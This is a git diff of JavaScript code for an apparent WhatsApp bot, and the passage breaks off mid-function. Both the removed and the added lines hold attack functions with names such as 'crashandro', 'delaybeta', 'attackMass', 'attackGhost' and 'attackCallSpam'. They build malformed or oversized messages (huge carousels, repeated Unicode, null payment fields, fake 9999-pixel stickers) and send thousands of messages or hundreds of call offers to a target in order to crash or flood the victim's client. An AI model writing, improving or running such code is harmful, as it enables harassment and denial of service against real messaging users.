-            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
-            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
-            scanLengths: [3537, 10557, 1905, 2353],
-            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
-          },
-        },
-        nativeFlowMessage: {
-          buttons: [],
-        },
-      });
-    }
-
-    const msg = await generateWAMessageFromContent(X, {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 3,
-          },
-          interactiveMessage: {
-            body: { text: " " },
-            footer: { text: "\u0003" },
-            header: { hasMediaAttachment: false },
-            carouselMessage: {
-              cards: cards,
-            },
-          },
-        },
-      },
-    }, {});
-
-    await client.relayMessage(X, {
-      groupStatusMessageV2: {
-        message: msg.message,
-      },
-    }, {
-      messageId: msg.key.id,
-      participant: { jid: X },
-    });
-
-    await sleep(100);
-  } catch (err) {
-    log.error(`hardfix2 error: ${err.message}`);
-  }
-}
-
-async function hardfix3(client, X) {
-  try {
-    let cards = [];
-    const maxCards = 400;
-
-    for (let r = 0; r < maxCards; r++) {
-      cards.push({
-        body: { text: " " },
-        footer: { text: " " },
-        header: {
-          title: " ",
-          hasMediaAttachment: true,
-          imageMessage: {
-            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
-            mimetype: "image/jpeg",
-            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
-            fileLength: "18352",
-            height: 720,
-            width: 1280,
-            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
-            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
-            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
-            mediaKeyTimestamp: "1737281900",
-            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
-            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
-            scanLengths: [3537, 10557, 1905, 2353],
-            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
-          },
-        },
-        nativeFlowMessage: {
-          buttons: [],
-        },
-      });
-    }
-
-    const msg = await generateWAMessageFromContent(X, {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 3,
-          },
-          interactiveMessage: {
-            body: { text: " " },
-            footer: { text: "\u0003" },
-            header: { hasMediaAttachment: false },
-            carouselMessage: {
-              cards: cards,
-            },
-          },
-        },
-      },
-    }, {});
-
-    await client.relayMessage(X, {
-      groupStatusMessageV2: {
-        message: msg.message,
-      },
-    }, {
-      messageId: msg.key.id,
-      participant: { jid: X },
-    });
-
-    await sleep(100);
-  } catch (err) {
-    log.error(`hardfix3 error: ${err.message}`);
-  }
-}
-
-// =====================================================================
-// 🔥 NEW POWERFUL CRASH COMMANDS - FLOOD ATTACKS
-// =====================================================================
-
-async function floodAttack(client, X) {
-  try {
-    const messages = [];
-    const messageCount = 1000;
-    
-    for (let i = 0; i < messageCount; i++) {
-      messages.push({
-        conversation: `💥 FLOOD ATTACK ${i + 1}/${messageCount}`
-      });
-    }
-    
-    for (let i = 0; i < messages.length; i += 10) {
-      const chunk = messages.slice(i, i + 10);
-      for (const msg of chunk) {
-        await client.relayMessage(X, {
-          message: msg
         }, {});
+        batchPromises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
       }
+      promises.push(Promise.all(batchPromises));
+      await sleep(100);
+    }
+    await Promise.all(promises);
+    log.crash(`NUKE 10x: 500 messages sent to ${target} 💥`);
+  } catch (err) { log.error(`NUKE error: ${err.message}`); }
+}
+
+async function attackMass(client, targets) {
+  try {
+    const promises = [];
+    for (const target of targets) {
+      for (let i = 0; i < 200; i++) {
+        const msg = generateWAMessageFromContent(target, {
+          message: {
+            viewOnceMessage: {
+              message: {
+                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
+                interactiveMessage: {
+                  body: { text: "🎯".repeat(50000) },
+                  carouselMessage: { cards: Array(100).fill({ body: { text: "💥".repeat(10000) }, nativeFlowMessage: { buttons: [] } }) }
+                }
+              }
+            }
+          }
+        }, {});
+        promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
+      }
+    }
+    await Promise.all(promises.slice(0, 500));
+    log.crash(`MASS 10x: ${targets.length} targets × 200 messages`);
+  } catch (err) { log.error(`MASS error: ${err.message}`); }
+}
+
+async function attackGhost(client, target) {
+  try {
+    // 500 رسالة خفية مع viewOnceMessage مزدوج
+    const promises = [];
+    for (let i = 0; i < 500; i++) {
+      const msg = generateWAMessageFromContent(target, {
+        message: {
+          viewOnceMessage: {
+            message: {
+              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
+              interactiveMessage: {
+                body: { text: "👻".repeat(20000) },
+                carouselMessage: { cards: Array(50).fill({ body: { text: " ".repeat(10000) }, nativeFlowMessage: { buttons: [] } }) }
+              }
+            }
+          }
+        }
+      }, {});
+      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
+      if (i % 50 === 0) await sleep(50);
+    }
+    await Promise.all(promises);
+    log.crash(`GHOST 10x: 500 hidden messages to ${target} 👻`);
+  } catch (err) { log.error(`GHOST error: ${err.message}`); }
+}
+
+// =====================================================================
+// NEW ATTACK FUNCTIONS - 10x ENHANCED
+// =====================================================================
+
+async function attackSpam(client, target) {
+  try {
+    // 2000 رسالة في 10 دفعات متوازية
+    const promises = [];
+    const batchSize = 200;
+    for (let batch = 0; batch < 10; batch++) {
+      const batchPromises = [];
+      for (let i = 0; i < batchSize; i++) {
+        const msg = generateWAMessageFromContent(target, {
+          message: { conversation: `📨 SPAM ${batch * batchSize + i}/2000 | ⚡ XZESO ⚡` }
+        }, {});
+        batchPromises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
+      }
+      promises.push(Promise.all(batchPromises));
       await sleep(50);
     }
-    
-    log.crash(`Flood attack sent ${messageCount} messages to ${X}`);
-  } catch (err) {
-    log.error(`floodAttack error: ${err.message}`);
-  }
+    await Promise.all(promises);
+    log.crash(`SPAM 10x: 2000 messages to ${target} 💬`);
+  } catch (err) { log.error(`SPAM error: ${err.message}`); }
 }
 
-async function spamBlast(client, X) {
+async function attackCallSpam(client, target) {
   try {
-    const spamCount = 500;
-    
-    for (let i = 0; i < spamCount; i++) {
-      const msg = await generateWAMessageFromContent(X, {
-        message: {
-          conversation: `🔥 SPAM BLAST ${i + 1} | ⚡ XZESO ⚡`
-        }
-      }, {});
-      
-      await client.relayMessage(X, {
-        message: msg.message
-      }, {
-        messageId: msg.key.id
-      });
-      
-      if (i % 50 === 0) await sleep(100);
-    }
-    
-    log.crash(`Spam blast sent ${spamCount} messages to ${X}`);
-  } catch (err) {
-    log.error(`spamBlast error: ${err.message}`);
-  }
-}
-
-async function mediaFlood(client, X) {
-  try {
-    const images = [
-      "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true"
-    ];
-    
-    for (let i = 0; i < 200; i++) {
-      const msg = await generateWAMessageFromContent(X, {
-        message: {
-          imageMessage: {
-            url: images[0],
-            mimetype: "image/jpeg",
-            caption: `🖼️ MEDIA FLOOD ${i + 1}/200`
-          }
-        }
-      }, {});
-      
-      await client.relayMessage(X, {
-        message: msg.message
-      }, {
-        messageId: msg.key.id
-      });
-      
-      if (i % 20 === 0) await sleep(100);
-    }
-    
-    log.crash(`Media flood sent 200 images to ${X}`);
-  } catch (err) {
-    log.error(`mediaFlood error: ${err.message}`);
-  }
-}
-
-async function buttonSpam(client, X) {
-  try {
-    const buttonCount = 300;
-    
-    for (let i = 0; i < buttonCount; i++) {
-      const msg = await generateWAMessageFromContent(X, {
-        message: {
-          interactiveMessage: {
-            body: { text: `🔘 BUTTON SPAM ${i + 1}/${buttonCount}` },
-            footer: { text: "⚡ XZESO BOT ⚡" },
-            header: { hasMediaAttachment: false },
-            nativeFlowMessage: {
-              buttons: [
-                {
-                  name: "copy_code",
-                  buttonParamsJson: JSON.stringify({
-                    display_text: "Copy",
-                    copied_code: "XZESO"
-                  })
-                }
-              ],
-              messageParamsJson: ""
-            }
-          }
-        }
-      }, {});
-      
-      await client.relayMessage(X, {
-        message: msg.message
-      }, {
-        messageId: msg.key.id
-      });
-      
-      if (i % 30 === 0) await sleep(100);
-    }
-    
-    log.crash(`Button spam sent ${buttonCount} buttons to ${X}`);
-  } catch (err) {
-    log.error(`buttonSpam error: ${err.message}`);
-  }
-}
-
-async function stickerFlood(client, X) {
-  try {
-    const stickerUrls = [
-      "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true"
-    ];
-    
-    for (let i = 0; i < 150; i++) {
-      const msg = await generateWAMessageFromContent(X, {
-        message: {
-          stickerMessage: {
-            url: stickerUrls[0],
-            mimetype: "image/webp",
-            fileLength: "10000"
-          }
-        }
-      }, {});
-      
-      await client.relayMessage(X, {
-        message: msg.message
-      }, {
-        messageId: msg.key.id
-      });
-      
-      if (i % 15 === 0) await sleep(100);
-    }
-    
-    log.crash(`Sticker flood sent 150 stickers to ${X}`);
-  } catch (err) {
-    log.error(`stickerFlood error: ${err.message}`);
-  }
-}
-
-async function reactionSpam(client, X) {
-  try {
-    const reactions = ['🔥', '💥', '⚡', '💀', '👻', '💣', '🚀', '🔪'];
-    const spamCount = 400;
-    
-    for (let i = 0; i < spamCount; i++) {
-      const reaction = reactions[i % reactions.length];
-      
-      const msg = await generateWAMessageFromContent(X, {
-        message: {
-          reactionMessage: {
-            key: { remoteJid: X, fromMe: true, id: generateRandomString(16) },
-            text: reaction
-          }
-        }
-      }, {});
-      
-      await client.relayMessage(X, {
-        message: msg.message
-      }, {
-        messageId: msg.key.id
-      });
-      
-      if (i % 40 === 0) await sleep(100);
-    }
-    
-    log.crash(`Reaction spam sent ${spamCount} reactions to ${X}`);
-  } catch (err) {
-    log.error(`reactionSpam error: ${err.message}`);
-  }
-}
-
-// Helper function for generating random strings
-function generateRandomString(length) {
-  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-  let result = '';
-  for (let i = 0; i < length; i++) {
-    result += chars.charAt(Math.floor(Math.random() * chars.length));
-  }
-  return result;
-}
-
-async function crashSendPaymentNPE(client, X) {
-  try {
-    await client.relayMessage(X, {
-      sendPaymentMessage: {
-        noteMessage: null,
-        requestMessageKey: undefined,
-        background: null,
-        contextInfo: {
-          externalAdReply: null
-        }
-      }
-    }, {
-      participant: { jid: X },
-      quoted: null
-    });
-    await sleep(50);
-  } catch (err) {
-    log.error(`crashSendPaymentNPE error: ${err.message}`);
-  }
-}
-
-async function fungadjigelo(client, X) {
-  try {
-    await client.relayMessage(X, {
-      sendPaymentMessage: {
-        noteMessage: null,
-        requestMessageKey: undefined,
-        background: null,
-        contextInfo: {
-          externalAdReply: null
-        }
-      }
-    }, {
-      participant: { jid: X },
-      quoted: null
-    });
-    await sleep(50);
-  } catch (err) {
-    log.error(`fungadjigelo error: ${err.message}`);
-  }
-}
-
-async function audiocall(client, X) {
-  try {
-    let devices = (
-      await client.getUSyncDevices([X], false, false)
-    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
-
+    // 500 مكالمة صوتية
+    const devices = (await client.getUSyncDevices([target], false, false))
+      .map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
     await client.assertSessions(devices);
 
-    let createMutex = () => {
-      let map = {};
-      return {
-        mutex(key, fn) {
-          map[key] ??= { task: Promise.resolve() };
-          map[key].task = (async prev => {
-            try { await prev; } catch {}
-            return fn();
-          })(map[key].task);
-          return map[key].task;
-        }
+    const promises = [];
+    for (let i = 0; i < 500; i++) {
+      const callNode = {
+        tag: "call",
+        attrs: { to: target, id: client.generateMessageTag(), from: client.user.id },
+        content: [{ tag: "offer", attrs: { "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(), "call-creator": client.user.id },
+          content: [
+            { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
+            { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
+            { tag: "net", attrs: { medium: "3" } },
+            { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
+            { tag: "encopt", attrs: { keygen: "2" } },
+            { tag: "destination", attrs: {}, content: [] }
+          ]
+        }]
       };
-    };
-
-    let mutexManager = createMutex();
-    let mergeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
-    let encodeMsg = client.encodeWAMessage?.bind(client);
-
-    client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
-      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
-
-      let patched = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);
-      let mapped = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
-
-      let { id: meId, lid: meLid } = client.authState.creds.me;
-      let decodedLidUser = meLid ? jidDecode(meLid)?.user : null;
-      let shouldIncludeDeviceIdentity = false;
-
-      let nodes = await Promise.all(mapped.map(async ({ recipientJid: jid, message: msg }) => {
-        let { user: targetUser } = jidDecode(jid);
-        let { user: ownPnUser } = jidDecode(meId);
-        let isOwnUser = targetUser === ownPnUser || targetUser === decodedLidUser;
-        let isSelf = jid === meId || jid === meLid;
-
-        if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;
-
-        let bytes = mergeBuffer(encodeMsg ? encodeMsg(msg) : encodeWAMessage(msg));
-
-        return mutexManager.mutex(jid, async () => {
-          let { type, ciphertext } = await client.signalRepository.encryptMessage({
-            jid,
-            data: bytes
-          });
-          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
-          return {
-            tag: 'to',
-            attrs: { jid },
-            content: [{
-              tag: 'enc',
-              attrs: { v: '2', type, ...extraAttrs },
-              content: ciphertext
-            }]
-          };
-        });
-      }));
-
-      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
-    };
-
-    let { nodes: destinations, shouldIncludeDeviceIdentity } =
-      await client.createParticipantNodes(
-        devices,
-        { conversation: "y" },
-        { count: '0' }
-      );
-
-    let callNode = {
-      tag: "call",
-      attrs: {
-        to: X,
-        id: client.generateMessageTag(),
-        from: client.user.id
-      },
-      content: [{
-        tag: "offer",
-        attrs: {
-          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
-          "call-creator": client.user.id
-        },
-        content: [
-          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
-          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
-          { tag: "net", attrs: { medium: "3" } },
-          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
-          { tag: "encopt", attrs: { keygen: "2" } },
-          { tag: "destination", attrs: {}, content: destinations },
-          ...(shouldIncludeDeviceIdentity ? [{
-            tag: "device-identity",
-            attrs: {},
-            content: encodeSignedDeviceIdentity(client.authState.creds.account, true)
-          }] : [])
-        ]
-      }]
-    };
-
-    await client.sendNode(callNode);
-    await sleep(50);
-  } catch (err) {
-    log.error(`audiocall error: ${err.message}`);
-  }
-}
-
-async function crashandro(client, X) {
-  try {
-    const cardsX = [];
-    for (let r = 0; r < 15; r++) {
-      cardsX.push({
-        header: {
-          title: "",
-          videoMessage: {
-            url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
-            mimetype: "video/mp4",
-            fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
-            fileLength: "289511",
-            seconds: 15,
-            mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
-            caption: "\u0000",
-            height: 640,
-            width: 640,
-            fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
-            directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
-            mediaKeyTimestamp: "1743848703",
-            streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
-            thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
-            thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
-            thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
-          },
-          hasMeidiaAttachment: true,
-        },
-        body: { text: "" },
-        nativeFlowMessage: {
-          messageParamsJson: "{".repeat(5000),
-        },
-      });
+      promises.push(client.sendNode(callNode).catch(() => {}));
+      if (i % 50 === 0) await sleep(50);
     }
-
-    const msg = generateWAMessageFromContent(
-      X,
-      {
-        viewOnceMessage: {
-          message: {
-            interactiveMessage: {
-              body: {
-                text: "🦠</🧬⃟༑⌁𝗫 𝗜 𝗡 𝗦 𝗢 𝗢" +
-                "ꦽ".repeat(10000) +
-                "ោ៝".repeat(8000) +
-                "@5".repeat(20000),
-              },
-              carouselMessage: {
-                cardsX,
-                messageVersion: 1,
-              },
-              contextInfo: {
-                participant: X,
-                mentionedJid: [
-                  "13529292@s.whatsapp.net",
-                  ...Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 5000000)),
-                ],
-                remoteJid: "X",
-                forwadingScore: 100,
-                isForwaded: true,
-                stanzaId: "123456789ABCDEF",
-                businessMessageForwardInfo: {
-                  businessOwnerJid: X,
-                },
-                quotedMessage: {
-                  paymentInviteMessage: {
-                    serviceType: 3,
-                    expiryTimestamp: Date.now() + 18144000,
-                  },
-                },
-              },
-            },
-          },
-        },
-      },
-      {}
-    );
-
-    await client.relayMessage(X, msg.message, {
-      participant: { jid: X },
-      messageId: msg.key.id
-    });
-
-    await sleep(100);
-  } catch (err) {
-    log.error(`crashandro error: ${err.message}`);
-  }
+    await Promise.all(promises);
+    log.crash(`CALL SPAM 10x: 500 calls to ${target} 📞`);
+  } catch (err) { log.error(`CALL SPAM error: ${err.message}`); }
 }
 
-async function delayhigh(client, X) {
+async function attackMediaFlood(client, target) {
   try {
-    const payload = generateWAMessageFromContent(X, {
-      viewOnceMessage: {
+    // 1000 ستكر ضخم 10x9999 مع payload مختلف لكل واحد
+    const urls = [
+      "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
+      "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true"
+    ];
+    const promises = [];
+    for (let i = 0; i < 1000; i++) {
+      const stickerData = urls[i % urls.length];
+      const msg = generateWAMessageFromContent(target, {
         message: {
-          interactiveResponseMessage: {
-            body: {
-              text: "\n",
-              format: "DEFAULT"
-            },
-            nativeFlowResponseMessage: {
-              name: "call_permission_request",
-              paramsJson: "\x10".repeat(100000),
-              version: 3,
-            },
-            entryPointConversionSource: "call_permission_message"
-          },
-        },
-      },
-    }, {
-      ephemeralExpiration: 0,
-      forwardingScore: 9741,
-      isForwarded: true,
-    });
-
-    await client.relayMessage(X, {
-      groupStatusMessageV2: {
-        message: payload.message,
-      },
-    }, {
-      messageId: payload.key.id,
-      participant: { jid: X },
-    });
-
-    await sleep(100);
-  } catch (err) {
-    log.error(`delayhigh error: ${err.message}`);
-  }
+          stickerMessage: {
+            url: stickerData,
+            mimetype: "image/webp",
+            fileLength: "99999999",
+            height: 9999, width: 9999,
+            mediaKey: crypto.randomBytes(32).toString("base64"),
+            fileEncSha256: crypto.randomBytes(32).toString("base64"),
+            fileSha256: crypto.randomBytes(32).toString("base64"),
+            directPath: "/v/t62.7118-24/" + crypto.randomBytes(16).toString("hex"),
+            mediaKeyTimestamp: Date.now().toString()
+          }
+        }
+      }, {});
+      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
+      if (i % 100 === 0) await sleep(50);
+    }
+    await Promise.all(promises);
+    log.crash(`MEDIA FLOOD 10x: 1000 stickers to ${target} 🖼️`);
+  } catch (err) { log.error(`MEDIA FLOOD error: ${err.message}`); }
 }
 
-async function delaybeta(client, X) {
+async function attackHiddenStickers(client, target) {
   try {
-    const imageMsg = {
-      url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
-      mimetype: "image/jpeg",
-      fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
-      fileLength: "99999999",
-      height: 9999,
-      width: 9999,
-      mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
-      fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
-      directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
-      mediaKeyTimestamp: "1755254367",
-      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
-      caption: "\u0000".repeat(50000)
-    };
-
-    let software = generateWAMessageFromContent(X, {
-      viewOnceMessage: {
+    // 2000 ستكر مخفي ضخم مع payload ضخم جداً
+    const payload = "🔥".repeat(100000);
+    const promises = [];
+    for (let i = 0; i < 2000; i++) {
+      const msg = generateWAMessageFromContent(target, {
         message: {
-          albumMessage: {
-            expectedImageCount: 666,
-            expectedVideoCount: 0,
-            items: [{ imageMessage: imageMsg }],
-            contextInfo: {
-              mentionedJid: [
-                "13135550002@s.whatsapp.net",
-                ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
-              ],
-              participant: "0@s.whatsapp.net",
-              remoteJid: "status@broadcast",
-              stanzaId: "1234567890ABCDEF",
-              forwardedNewsletterMessageInfo: {
-                newsletterName: "...",
-                newsletterJid: "0@newsletter",
-                serverMessageId: 1
-              },
-              eventCoverImage: {
-                eventId: Date.now() + 1814400000,
-                eventName: "Kountol",
-                eventDescription: "ꦽ".repeat(10000),
-                startTime: 9999999999,
-                endTime: 99999999999,
-                eventCoverMedia: {
-                  url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
-                  mimetype: "image/jpeg",
-                  fileLength: "9999999999999",
-                  height: 9999,
-                  width: 9999,
-                  caption: "ោ៝".repeat(10000),
-                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHipotKC0qPTgzMzg9UJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k="
-                },
-                eventLocation: {
-                  name: ">#NortexZ",
-                  address: "ោ៝".repeat(10000),
-                  degreesLatitude: -922.99999999,
-                  degreesLongitude: 922.999999999999,
-                  url: "https://t.me/NortexZ"
-                },
-                eventParticipants: {
-                  participants: [{ jid: X, displayName: "Participant" }]
-                },
-                eventStatus: "@MarkZugasu",
-                eventOptions: {
-                  isAnonymous: true,
-                  canGuestsInvite: true,
-                  canSeeGuestList: true,
-                  maxParticipants: 9999999999,
-                  requiresApproval: false,
-                  customField1: "HI!",
-                  customField2: "HI!"
-                },
-                eventMetadata: JSON.stringify({
-                  heavy_data: "ACCOUNTS",
-                  nested: {
-                    level1: "X".repeat(546),
-                    level2: {
-                      level3: "X".repeat(546),
-                      level4: {
